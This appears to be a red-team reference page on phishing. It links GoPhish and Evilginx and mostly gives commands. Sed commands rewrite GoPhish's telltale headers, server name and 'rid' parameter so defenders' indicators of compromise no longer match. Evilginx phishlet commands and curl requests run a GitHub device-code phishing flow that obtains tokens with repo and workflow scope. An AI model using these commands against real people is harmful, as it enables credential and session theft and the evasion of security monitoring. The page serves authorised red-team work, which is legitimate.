# Phishing

> Phishing is a cybersecurity attack where malicious actors impersonate legitimate organizations (like banks, social media platforms, or email providers) to trick people into revealing sensitive information such as passwords, credit card numbers, or personal data.

## Opsec Fails

* **Reusing IPs/Domains**: Using the same IP address or domain across multiple campaigns or malware families.
* **No Domain Privacy**: WHOIS records exposing registrant info (name, email, phone).
* **Same Registrant Email**: Reusing the same email address across domains.
* **Unrotated SSL Certificates**: Self-signed or identical certificates reused across phishing sites.

## GoPhish

* [gophish/gophish](https://github.com/gophish/gophish) - Open-Source Phishing Toolkit
* [kgretzky/gophish/](https://github.com/kgretzky/gophish/) - Gophish integration with Evilginx 3.3
* [puzzlepeaches/sneaky_gophish](https://github.com/puzzlepeaches/sneaky_gophish) - Hiding GoPhish from the boys in blue

```ps1
git clone https://github.com/gophish/gophish.git
go build
```

### IOC

* `X-Gophish-Contact` and `X-Gophish-Signature`

    ```ps1
    find . -type f -exec sed -i.bak 's/X-Gophish-Contact/X-Contact/g' {} +
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request_test.go
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog.go
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog_test.go
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request.go

    find . -type f -exec sed -i.bak 's/X-Gophish-Signature/X-Signature/g' {} +
    sed -i 's/X-Gophish-Signature/X-Signature/g' webhook/webhook.go
    ```

* Default server name

    ```ps1
    sed -i 's/const ServerName = "gophish"/const ServerName = "IGNORE"/' config/config.go
    ```

* Default `rid` parameter

    ```ps1
    sed -i 's/const RecipientParameter = "rid"/const RecipientParameter = "keyname"/g' models/campaign.go
    ```

## Evilginx

* [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) - Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication
* [evilginxpro](https://evilginx.com/) - The phishing framework for red teams

```ps1
# List Available Phishlets
phishlets

# Enable a Phishlet
phishlets enable <phishlet_name>

# Disable a Phishlet
phishlets disable <phishlet_name>
```

## Device Code Phishing

* Github

    ```ps1
    curl -X POST https://github.com/login/device/code \
    -H "Accept: application/json" \
    -d "client_id=01ab8ac9400c4e429b23&scope=user+repo+workflow"

    curl -X POST https://github.com/login/oauth/access_token \
    -H "Accept: application/json" \
    -d "client_id=01ab8ac9400c4e429b23&device_code=be9<code_from_earlier>&&grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code" -k | jq
    ```

## References

* [A Smooth Sea Never Made a Skilled Phisherman - Kuba Gretzky - 8 july 2024](https://youtu.be/Nh99d3YnpI4)
* [Introducing: GitHub Device Code Phishing - John Stawinski, Mason Davis, Matt Jackoski - June 12, 2025](https://www.praetorian.com/blog/introducing-github-device-code-phishing/)
* [Never had a bad day phishing. How to set up GoPhish to evade security controls - Nicholas Anastasi - Jun 30, 2021](https://www.sprocketsecurity.com/blog/never-had-a-bad-day-phishing-how-to-set-up-gophish-to-evade-security-controls)
* [Unraveling and Countering Adversary-in-the-Middle Phishing Attacks - Pawel Partyka - 8 july 2024](https://youtu.be/-W-LxcbUxI4)
